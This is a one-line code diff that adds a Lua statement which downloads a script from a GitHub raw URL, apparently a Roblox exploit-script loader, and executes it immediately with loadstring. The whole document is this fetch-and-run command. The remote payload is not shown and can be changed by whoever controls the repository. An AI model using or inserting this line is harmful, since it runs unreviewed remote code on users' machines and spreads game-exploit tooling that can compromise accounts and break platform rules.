@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/apple-ipad-original-spam0-a676r6pljmd9df.lua"))()
